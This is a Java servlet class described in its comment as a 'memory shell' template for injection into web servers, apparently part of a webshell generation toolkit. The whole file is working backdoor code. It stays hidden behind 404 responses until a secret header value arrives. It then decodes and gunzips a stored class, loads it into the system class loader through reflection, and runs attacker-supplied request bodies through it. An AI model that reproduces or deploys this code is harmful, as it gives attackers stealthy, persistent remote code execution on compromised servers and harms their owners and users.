package org.leo.jmg.mem.shell.http;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.zip.GZIPInputStream;

/**
 * Servlet 形态内存 Shell 模板（与 {@link LeoFilterTpl} 触发逻辑一致，供 Servlet 注册型注入器使用）
 */
public class LeoServletTpl extends HttpServlet {

    private static String headerName;
    private static String headerValue;

    private static String coreClassName;
    private static String coreClass;
    private static int respCode;

    @Override
    protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String actualHeader = request.getHeader(headerName);
        if (actualHeader == null || !actualHeader.contains(headerValue)) {
            response.sendError(HttpServletResponse.SC_NOT_FOUND);
            return;
        }

        response.setStatus(respCode);
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int bytesRead;
            try {
                Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader());
            } catch (ClassNotFoundException e) {
                GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(base64Decode(coreClass)));
                while ((bytesRead = gzipInputStream.read(buffer)) != -1) {
                    byteArrayOutputStream.write(buffer, 0, bytesRead);
                }
                Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",
                        String.class, byte[].class, int.class, int.class);
                defineClassMethod.setAccessible(true);
                defineClassMethod.invoke(ClassLoader.getSystemClassLoader(),
                        null, byteArrayOutputStream.toByteArray(), 0, byteArrayOutputStream.size());
            } finally {
                InputStream inputStream = request.getInputStream();
                byteArrayOutputStream.reset();
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    byteArrayOutputStream.write(buffer, 0, bytesRead);
                }
                try {
                    ((java.lang.reflect.InvocationHandler) Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader()).newInstance()).invoke(null, null, new Object[]{byteArrayOutputStream});
                } catch (Throwable e) {
                    throw new IllegalStateException("Core invocation failed", e);
                }
                response.getOutputStream().write(byteArrayOutputStream.toByteArray());
            }
        } catch (Exception ignored) {
            if (!response.isCommitted()) {
                response.sendError(HttpServletResponse.SC_NOT_FOUND);
            }
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class<?> clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var5) {
            Class<?> clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
}
